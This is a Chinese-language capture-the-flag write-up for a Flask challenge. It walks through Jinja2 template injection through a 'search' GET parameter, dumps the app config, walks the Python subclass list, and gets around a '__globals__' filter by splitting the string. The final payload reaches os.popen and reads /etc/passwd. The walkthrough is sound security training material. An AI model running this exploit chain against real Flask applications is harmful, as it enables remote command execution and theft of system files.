主页面如下：

![image-20250913100218037](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913100218037.png)

html中有注释如下：

```html
| <!-- Parameter Name: search --> |
| <!-- Method: GET -->            |
```

因为是flask，我们先试试有没有SSTI漏洞，构造payload如下：

`?search={{7*7}}`

![image-20250913100514431](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913100514431.png)

利用`{{config}}`查看配置信息，其中有信息如下：

`'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}'`

我们可以确定目标了。使用payload`{{().__class__.__bases__[0].__subclasses__()}}`查看所有子类，将所有显示的内容保存下来，并整理成一行一行的形式，方便我们找目标，python整理可以如下：

```python
# 读取文件内容
with open('tmp', 'r', encoding='utf-8') as file:
    content = file.read()

# 按逗号分割，每个元素单独一行
split_content = content.split(',')

# 写回文件，每个元素一行
with open('tmp', 'w', encoding='utf-8') as file:
    for item in split_content:
        file.write(item.strip() + '\n')  # 去除空格并换行
```

我们找warnings.catch_warnings，发现是60行，因为`__subclasses()__`是从0开始，所以

`{{().__class__.__bases__[0].__subclasses__()[59]}}`即为目标

![image-20250913102320029](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20250913102320029.png)

发现`__globals__`是被过滤了，我们直接拼接法，最后payload如下

```
?search={{().__class__.__bases__[0].__subclasses__()[59].__init__['__glo'+'bals__'].__builtins__['__import__']('os').popen('cat /etc/passwd').read()}}
```

最后找了一下flag是在`/flasklight/coomme_geeeett_youur_flek`中，和上面config读取的信息没啥关系